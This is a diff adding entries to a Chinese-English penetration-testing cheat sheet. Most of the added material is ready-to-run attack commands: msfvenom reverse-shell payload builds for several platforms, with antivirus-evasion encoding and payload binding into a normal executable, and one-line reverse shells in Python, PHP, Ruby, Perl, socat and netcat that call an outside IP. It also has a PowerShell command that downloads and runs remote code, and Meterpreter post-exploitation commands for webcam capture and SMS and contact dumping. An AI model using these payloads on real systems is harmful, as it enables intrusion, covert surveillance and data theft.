@@ -318,6 +318,10 @@ meterpreter > ipconfig
 IP Address  : 10.1.13.2
 
 MSF Payloads
+msfvenom -l payloads #查看所有--payload的模块
+msfvenom --help-formats
+msfvenom -l | grep windows | grep x64 | grep tcp
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
@@ -338,6 +342,71 @@ add <?php at the beginning
 perl -i~ -0777pe's/^/<?php \n/' shell.php
 MSF 生成反弹 Win Shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=222.222.221.140 lport=1211 -f exe > /root/shell.exe
+msfvenom -p android/meterpreter/reverse_tcp LHOST=你kali的ip LPORT=5555 R > /root/apk.apk
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.142 lport=443 -f exe X > flash_win7.exe
+msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:\back.exe
+msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe
+msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\nomal.exe –k –f exe –o C:\shell.exe #捆绑
+Msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe
+Msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\back.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On>-f raw > shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+
+python反弹
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+php反弹shell和python的方式差不多
+php -r '$sock=fsockopen("192.168.2.102",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+ruby反弹
+ruby -rsocket -e'f=TCPSocket.open("192.168.2.102",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+socat反弹
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.2.102:4444
+Perl反弹
+perl -e 'use Socket;$i="192.168.2.102";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+使用powershell执行
+IEX (New-Object
+System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.2.103 -p 4444 -e cmd
+NC反弹
+服务端反弹：nc 192.168.2.103 4444 -e c:\windows\system32\cmd.exe
+MSF反弹
+我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们需要的各类反弹一句话payload的路径信息。
+msfvenom -l payloads | grep 'cmd/windows/reverse'
+
+metasploit侦听
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_tcp
+set payload android/meterpreter/reverse_tcp
+show options
+set lhost 192.168.187.130
+set lport 4444
+exploit
+> ls
+> screenshot
+> webcam_stream
+> webcam_snap
+> dump_contacts
+> dump_sms
+> download test/test.txt
+> sysinfo
+background    #后台运行当前session
+sessions    #列出所有session
+sessions -i Id   #选择某一个sessionID进入session
+sessions -n Name -i Id    #给session重命名
+
+https://www.metasploit.com/download
+https://docs.rapid7.com/metasploit/
+https://osx.metasploit.com/
+https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
 
 BASH 反弹 Shell
 bash -i >& /dev/tcp/X.X.X.X/443 0>&1
@@ -1021,4 +1090,50 @@ openvas-feed-update
 openvasmd -h
 openvas-start
 https://127.0.0.1:9392
+
+https://github.com/xenkuo/comNG
+comNG 是一款具有现代化 UI 设计并且功能强大的串口助手软件。
+
+蚁剑
+https://github.com/AntSwordProject/AntSword-Loader
+https://github.com/AntSwordProject/antSword
+Windows平台的弱口令审计工具
+https://github.com/shack2/SNETCracker
+暴力破解字典生成工具
+https://github.com/landgrey/pydictor
+POWERSHELL脚本免杀
+https://github.com/the-xentropy/xencrypt
+THEFATRAT
+https://github.com/Screetsec/TheFatRat
+burpsuit
+https://github.com/c0ny1/jsEncrypter
+https://github.com/topics/burpcrypto
+PHP文件包含上传漏洞目录遍历命令执行漏洞
+https://www.freebuf.com/articles/web/246651.html
+
+提取Electron的源代码
+npx asar extract app.asar source
+
+文件上传靶场
+https://github.com/c0ny1/upload-labs
+
+子域名查询
+https://github.com/lijiejie/subDomainsBrute
+https://github.com/aboul3la/Sublist3r
+https://github.com/TheRook/subbrute
+https://github.com/FeeiCN/ESD
+https://github.com/shmilylty/OneForAll
+http://sh3ll.me/archives/201704041222.txt
+https://github.com/webanalyzer/rules
+https://github.com/projectdiscovery/subfinder
+https://github.com/projectdiscovery/shuffledns
+https://github.com/blechschmidt/massdns
+
+graudit安全漏洞检测
+https://github.com/wireghoul/graudit
+cd ~/bin && mkdir graudit
+ln --symbolic ~/graudit/graudit ~/bin/graudit
+alias graudit="~/bin/graudit"
+graudit -h
+graudit -d ~/gradit/signatures/js.db /path/
 
